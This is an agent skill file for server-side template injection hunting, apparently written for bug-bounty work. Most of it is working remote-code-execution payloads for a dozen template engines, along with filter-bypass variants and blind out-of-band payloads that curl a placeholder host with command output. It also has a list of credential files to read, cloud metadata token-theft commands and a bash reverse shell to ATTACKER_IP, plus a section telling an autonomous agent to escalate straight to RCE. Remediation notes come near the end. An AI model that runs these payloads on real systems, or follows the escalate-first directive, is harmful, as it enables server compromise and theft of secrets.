---
name: ssti-hunter
description: An SSTI detection, fingerprinting, and exploitation engine. Triggered by suspected server-side evaluation (e.g., {{7*7}} = 49) or stack traces referencing a template engine (Jinja2, Twig, FreeMarker, etc.). Facilitates blind detection, sandbox escapes, and escalation to RCE. Includes report structuring (severity, CWE, remediation).
license: MIT
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["ssti", "rce", "injection", "template", "web"]
---

# SSTI Hunter — Server-Side Template Injection

SSTI occurs when user input is embedded directly into a template and evaluated by the engine. The result is almost always **Remote Code Execution** on the server.

---

## Phase 1 — Find Injection Points

| Surface | Example |
|---|---|
| URL query parameters | `/search?q=Hello` |
| URL path segments | `/greet/John` |
| HTTP headers | `User-Agent`, `Referer`, custom headers |
| Form inputs / POST body | Name, email, message fields |
| Cookies | `username=John`, theme/locale cookies |
| File names | Upload endpoints echoing the original filename |
| Email templates | Name field in password reset emails |
| Profile fields | Display name, bio, job title |

Confirm reflection first: submit a canary string (e.g. `SSTI_TEST_1337`) and verify it appears in the response before probing.

---

## Phase 2 — Detect: Is It Vulnerable?

Send each probe — look for the **evaluated result**, not the literal string:

```
{{7*7}}          → 49
${7*7}           → 49
<%= 7*7 %>       → 49
#{7*7}           → 49
*{7*7}           → 49
{{7*'7'}}        → 49 or 7777777  (engine-differentiating)
```

- **Evaluated result** → confirmed SSTI
- **Literal string reflected** → not injectable (or filtered)
- **500 error** → still injectable; note the stack trace — it usually names the engine

Error-trigger probes:
```
{{          → Jinja2/Twig unclosed tag
${          → FreeMarker/Velocity/Mako unclosed expression
<#assign x= → FreeMarker syntax error
@{1+1}      → Thymeleaf expression error
```

---

## Phase 3 — Fingerprint: Which Engine?

```
Start: submit {{7*7}}
│
├─ Returns 49
│   ├─ {{7*'7'}} → 7777777   →  Jinja2  (Python)
│   ├─ {{7*'7'}} → 49        →  Twig    (PHP)
│   └─ {{dump(1)}} returns   →  Smarty  (PHP) — also try {7*7}
│
├─ {{ fails but ${7*7} → 49
│   ├─ Java stack trace
│   │   ├─ "FreeMarker"      →  FreeMarker (Java)
│   │   ├─ "Velocity"        →  Velocity   (Java)
│   │   ├─ "Pebble"          →  Pebble     (Java)
│   │   └─ "Thymeleaf"       →  Thymeleaf  (Java) — also try *{7*7}
│   └─ Python stack trace    →  Mako (Python)
│
├─ <%= 7*7 %> → 49
│   ├─ Ruby headers/trace    →  ERB   (Ruby)
│   └─ Node headers/trace    →  EJS   (Node.js)
│
├─ #{7*7} → 49               →  Pug   (Node.js) or Smarty (PHP)
│
└─ *{7*7} or [[${7*7}]] → 49 →  Thymeleaf (Java / Spring)
```

### Engine Reference

| Engine | Language | Framework | Delimiters |
|---|---|---|---|
| Jinja2 | Python | Flask, Django, Ansible | `{{ }}` `{% %}` |
| Twig | PHP | Symfony, WordPress | `{{ }}` `{% %}` |
| Smarty | PHP | Legacy PHP | `{ }` |
| Mako | Python | Pyramid | `${ }` `<% %>` |
| FreeMarker | Java | Spring MVC | `${ }` `<#...>` |
| Velocity | Java | JIRA, Confluence | `$var` `#set` |
| Pebble | Java | Spring | `{{ }}` `{% %}` |
| Thymeleaf | Java | Spring Boot | `*{ }` `[[ ]]` |
| ERB | Ruby | Rails | `<%= %>` `<% %>` |
| EJS | JavaScript | Express | `<%= %>` `<% %>` |
| Pug/Jade | JavaScript | Express | `#{ }` `- code` |
| Handlebars | JavaScript | Express | `{{ }}` |
| Nunjucks | JavaScript | Express | `{{ }}` `{% %}` |

---

## Phase 4 — Exploitation per Engine

Confirmation payloads are in Phase 2/3. Jump straight to RCE.

---

### 4.1 Jinja2 (Python — Flask / Django / Ansible)

```python
# RCE via globals (simplest)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Flask global shortcuts
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via request (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Find Popen dynamically (when index is unknown)
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in cls.__name__ %}
    {{cls(['id'],stdout=-1).communicate()[0].decode()}}
  {% endif %}
{% endfor %}

# File read
{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

---

### 4.2 Twig (PHP — Symfony / WordPress / Craft CMS)

```php
# RCE via filter callback (Twig < 1.20)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE via map/filter (Twig 1.x)
{{["id"]|map("system")|join}}
{{['id']|filter('system')}}
{{[1,2]|sort((a,b)=>system('id'))}}

# File read
{{source('/etc/passwd')}}

# Twig 2.x / 3.x (hardened — abuse attribute function)
{{attribute(loop.body,'include',{template:'/etc/passwd'})}}
```

---

### 4.3 Smarty (PHP — legacy apps)

```php
# RCE — php tag enabled (Smarty 2.x / 3.x)
{php}echo `id`;{/php}

# RCE — static method call
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# RCE — php tag disabled (Smarty 3+)
{math equation="0" format="%1\$s" a=system('id')}
{assign var=a value='id'}{if system($a)}{/if}
```

---

### 4.4 Mako (Python — Pyramid / standalone)

```python
# Expression block
${__import__('os').popen('id').read()}

# Code block
<%
import os
x = os.popen('id').read()
%>
${x}

# Module-level block
<%!
import os
%>
${os.popen('id').read()}
```

---

### 4.5 FreeMarker (Java — Spring MVC / standalone)

```java
# RCE via Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# RCE via API access (FreeMarker 2.3.22+)
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign runtime=clazz?api.getRuntime()>
<#assign process=runtime?api.exec("id")>
<#assign is=process?api.inputStream>
<#assign br=["java.io.BufferedReader"]?new(["java.io.InputStreamReader"]?new(is))>
${br?api.readLine()}

# File read
<#assign file=["java.io.File"]?new("/etc/passwd")>
<#assign scanner=["java.util.Scanner"]?new(file)>
${scanner.useDelimiter("\\Z").next()}

# Square bracket syntax (alternate delimiters)
[#assign ex="freemarker.template.utility.Execute"?new()][=ex("id")]
```

---

### 4.6 Velocity (Java — JIRA / Confluence / legacy)

```java
# RCE via ClassTool
#set($runtime=$class.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
#set($reader=new java.io.BufferedReader(new java.io.InputStreamReader($process.getInputStream())))
$reader.readLine()

# RCE via VelocityView (VelocityTools)
#set($x=$request.class.forName("java.lang.Runtime"))
#set($rt=$x.getMethod("getRuntime",$x.forName("java.lang.Class")[0]).invoke(null,null))
#set($p=$rt.exec("id"))
#set($reader=new java.io.BufferedReader(new java.io.InputStreamReader($p.inputStream)))
$reader.readLine()
```

---

### 4.7 Pebble (Java — Spring / standalone)

```java
{% set rt = "".__class__.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null) %}
{% set cmd = rt.exec("id") %}
{% set is = cmd.inputStream %}
{% set isr = "".__class__.forName("java.io.InputStreamReader").__constructor__(is).newInstance(is) %}
{% set br = "".__class__.forName("java.io.BufferedReader").__constructor__(isr).newInstance(isr) %}
{{ br.readLine() }}
```

---

### 4.8 Thymeleaf (Java — Spring Boot)

Thymeleaf SSTI usually appears in **Spring MVC path variables mapped to template names**: `return "user/" + userInput;`

```java
# Detect (SpEL inline expressions)
*{7*7}
[[${7*7}]]

# RCE via T() SpEL operator
*{T(java.lang.Runtime).getRuntime().exec('id')}

# RCE with output capture via ProcessBuilder
*{new java.util.Scanner(
    new java.lang.ProcessBuilder(new String[]{"id"}).start().getInputStream()
).useDelimiter("\\A").next()}

# File read
*{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter("\\A").next()}

# Environment dump
*{T(java.lang.System).getenv()}
```

---

### 4.9 ERB (Ruby — Rails)

```ruby
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

### 4.10 EJS (JavaScript — Express / Node.js)

```javascript
<%= require('child_process').execSync('id').toString() %>
<%= require('fs').readFileSync('/etc/passwd','utf8') %>

// EJS options injection (when options object is user-controlled)
{"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}
```

---

### 4.11 Pug / Jade (JavaScript — Express / Node.js)

```jade
- var x = require('child_process').execSync('id').toString()
= x

- var f = require('fs').readFileSync('/etc/passwd','utf8')
= f
```

---

### 4.12 Handlebars (JavaScript — Express / standalone)

Handlebars is logic-less — RCE requires prototype pollution (< 4.7.7):

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

### 4.13 Nunjucks (JavaScript — Express / Mozilla)

```javascript
// Via constructor chain
{{"test".constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

// Via range global
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

---

## Phase 5 — Bypass Techniques

### 5.1 String Concatenation

```python
# Jinja2 — split blocked keywords
{{''.__class__['__m'+'ro__']}}
{{config['__class__']['__init__']['__glob'+'als__']['os']['po'+'pen']('id').read()}}
```

### 5.2 Encoding Bypasses

```
%7B%7B7*7%7D%7D          URL-encoded {{7*7}}
%257B%257B7*7%257D%257D  Double URL-encoded
&#123;&#123;7*7&#125;&#125;  HTML entities
｛｛7*7｝｝               Fullwidth braces (Unicode normalization)
```

### 5.3 Alternate Attribute Access (Jinja2)

```python
obj.attr         →  obj['attr']  or  obj|attr('attr')
''.__class__     →  ''['\x5f\x5fclass\x5f\x5f']
# Full encoded bypass (Flask)
{{request|attr('\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### 5.4 Comment Injection

```
# Break naive "{{" WAF detection
{{7{#comment#}*7}}
{{- 7*7 -}}

# FreeMarker square bracket alternate syntax
[=7*7]
[#assign ex="freemarker.template.utility.Execute"?new()][=ex("id")]
```

---

## Phase 6 — Blind SSTI

When output is not reflected (email, PDF, background job):

### Time-Based

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
# ERB
<%= `sleep 5` %>
# EJS
<%= require('child_process').execSync('sleep 5') %>
```

### Out-of-Band (Burp Collaborator / interactsh)

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('curl http://OOB.URL/?x=$(id|base64)').read()}}
# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://OOB.URL/?x=$(id|base64)")}
# ERB
<%= `curl http://OOB.URL/?x=$(id|base64)` %>
# EJS
<%= require('child_process').execSync('curl http://OOB.URL/?x=$(id|base64)') %>
```

---

## Phase 7 — Escalate Impact

### Sensitive Files

```
/etc/passwd
/etc/shadow               (root only)
/proc/self/environ        (env vars — secrets, API keys)
~/.ssh/id_rsa             (SSH private key)
.env                      (DB creds, API keys)
config/database.yml       (Rails DB credentials)
/app/settings.py          (Django SECRET_KEY, DB)
/var/www/html/wp-config.php
```

### Cloud Metadata (SSRF via RCE)

```bash
# AWS IAM credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# GCP token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Phase 8 — Confirm the Finding

- [ ] Math expression evaluated server-side (not reflected as-is)
- [ ] Engine identified from decision tree
- [ ] RCE payload returned `id`/`whoami` output — OR — blind confirmed via time delay / OOB
- [ ] Reproducible in a fresh session with attacker's own credentials

**False positive checks:**
- `{{7*7}}` displayed literally → not SSTI (template may sanitize or escape output)
- `{{7*7}}` evaluated in the browser → client-side injection (AngularJS), not SSTI

---

## Phase 9 — Report Structure

```
Title: SSTI in [parameter] on [endpoint] — RCE via [Engine Name]

Severity: Critical
CWE: CWE-94 | OWASP: A03:2021 – Injection

Affected endpoint: [METHOD] [URL]
Affected parameter: [name]
Template engine: [Engine + Language]

Steps to reproduce:
1. Send: [exact HTTP request with payload]
2. Observe: response contains [evaluated output]
3. Escalated PoC: [RCE payload] → output: [id command result / OOB callback]

Impact:
- RCE as [process user]
- Full compromise of application secrets and credentials
- Lateral movement to internal network / cloud metadata

Evidence:
- Request / Response snippet showing evaluation
- OOB callback log (for blind SSTI)

Remediation:
- Never render user input as a template string
  UNSAFE: render(user_input)
  SAFE:   render("Hello {{ name }}", {"name": user_input})
- Jinja2: use SandboxedEnvironment
- Twig: enable sandbox extension
- FreeMarker: set TemplateClassResolver.SAFER_RESOLVER
- Input validation alone is insufficient — template syntax is too varied
```

---

## Quick-Reference: Priority Order

1. URL query parameters — fastest, most common
2. Error pages that reflect input — stack trace names the engine
3. Template/theme selection params — `?template=`, `?theme=`, `?lang=`
4. Name/display fields — often rendered in emails or PDFs (blind)
5. Admin / CMS template editors — high privilege, maximum impact

---

## Reference Files

- `references/payloads.md` — Per-engine payload cheatsheet
- `references/tools.md` — tplmap, SSTImap, Burp extensions, Nuclei


---

## From hack-skills: SSTI Advanced Techniques

### Engine Disambiguation

```
{{7*'7'}} → "7777777" = Jinja2  |  "49" = Twig
${7*7}    → "49" = FreeMarker/Velocity/EL  |  "${7*7}" literal = not evaluated
#{7*7}    → "49" = ERB  |  literal = not ERB
@{7*7}    → "49" = Thymeleaf SpEL  |  literal = not Thymeleaf
```

### Engine → Language Mapping

| Template Engine | Language | Key Indicator |
|---|---|---|
| Jinja2 | Python (Flask) | `{{7*'7'}}` = 7777777 |
| Django | Python | `{% debug %}` shows context |
| Mako | Python | `${7*7}` works |
| Twig | PHP | `{{7*'7'}}` = 49 |
| Smarty | PHP | `{$smarty.version}` |
| FreeMarker | Java | `${7*7}` works |
| Velocity | Java | `#set($x=7*7)$x` |
| Pebble | Java | `{{ 7*7 }}` works |
| Thymeleaf | Java | `[[${7*7}]]` works |
| ERB | Ruby | `<%= 7*7 %>` |
| Slim/Haml | Ruby | `= 7*7` |
| Jade/Pug | Node.js | `= 7*7` |
| Handlebars | Node.js | `{{7*7}}` returns literal (not eval) |
| Tornado | Python | `{{ 7*7 }}` works |

### Jinja2 RCE Chains

```python
# Chain 1: direct config globals
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Chain 2: MRO subclass traversal (class index varies by app)
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
# Find correct index: {{''.__class__.__mro__[1].__subclasses__()}}

# Chain 3: request object globals with hex encoding
{{request.__class__.__init__.__globals__['\x6f\x73'].popen('id').read()}}

# Chain 4: lipsum globals
{{lipsum.__globals__.os.popen('id').read()}}

# Chain 5: cycler globals
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Jinja2 Sandbox Bypasses

```python
# Underscore blocked → use attr() with hex encoding:
{{request|attr('\x5f\x5fclass\x5f\x5f')}}

# Dot access blocked → use [] notation:
{{request['__class__']}}

# Keywords blocked → hex in attr():
{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')[1]|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

### Flask PIN Calculation (console access)

Requires all of these from server:
1. Username running Flask process (e.g., from `/proc/self/environ` or `/etc/passwd`)
2. Module name: `flask.app`
3. App path: absolute path to `app.py` (from error page or `/proc/self/cmdline`)
4. MAC address in decimal (from `/sys/class/net/eth0/address` → convert to int)
5. Machine-id (from `/etc/machine-id` or `/proc/sys/kernel/random/boot_id`)

Then compute PIN using the Flask source algorithm (varies by Flask version — search `get_pin_and_cookie_name` in Flask source).

### Other Engine Payloads

```
# FreeMarker:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Twig 1.x:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x:
{{['id']|map('system')|join}}

# Velocity:
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
#set($cmd=$rt.exec("id"))

# ERB:
<%= system('id') %>
<%= `id` %>

# Thymeleaf:
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

# AngularJS CSTI (client-side):
{{constructor.constructor('alert(1)')()}}

# Universal probe:
${{<%[%'"}}%\.
```


---

## hunt-ssti — Hunting Methodology (real BB reports)

## Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.

